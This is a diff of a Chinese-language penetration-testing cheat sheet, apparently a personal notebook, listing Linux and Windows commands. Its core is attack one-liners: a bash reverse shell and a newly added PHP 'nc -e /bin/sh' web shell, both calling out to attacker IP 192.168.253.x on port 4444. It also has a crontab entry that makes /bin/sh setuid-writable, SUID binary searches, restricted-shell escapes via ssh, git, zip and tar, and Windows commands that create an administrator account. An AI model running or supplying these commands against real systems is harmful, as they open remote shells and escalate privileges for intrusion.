@@ -41,6 +41,7 @@ sudo                    //以系统管理者身份执行指令
 chmod                   //变更文件或目录的权限
 env                     //显示系统环境变量         <-u从当前环境中删除指定的变量>
 echo                    //打印输出
+wget					//从指定的URL下载文件
 clear                   //清屏
 ifconfig                //显示或设置网络设备
 netstat                 //显示网络状态             <-pantu>
@@ -59,6 +60,7 @@ reboot                  //重启
 
 ```
 bash -c 'sh -i &>/dev/tcp/192.168.253.139/4444 0>&1'
+<?php system("nc -e /bin/sh 192.168.253.136  4444"); ?>
 echo "* * * * * root chmod 4777 /bin/sh" | sudo teehee -a /etc/crontab
 find / -user root -perm -4000 -print 2>/dev/null
 find / -user root -perm -4000 -exec ls -ldb {} ;
@@ -86,7 +88,7 @@ ssh user@IP -t "bash --noprofile"
 ssh user@IP -t "() { :; }; /bin/bash"
 pico -s "/bin/bash"进入编辑器写入/bin/bash然后按ctrl + T键
 git -p help 然后 !/bin/sh或!/bin/bash
-zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c/bin/bash"
+zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
 tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash
 -------------------------------------------------------
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -126,7 +128,7 @@ net user name password /add                //创建用户
 net localgroup administrators name /add    //提升权限
 net user name /delete                      //删除用户
 systeminfo                                 //当前计算机的综合信息
-tasklist                                   //显示当前运行的进程信息
+tasklist                                   //显示当前运行的进程信息 </svc显示进程主持的服务>
 taskkill /pid num                          //结束进程            </f强行终止/t由此启动的子进程>
 ipconfig /flushdns                         //清除本地DNS缓存
 ```
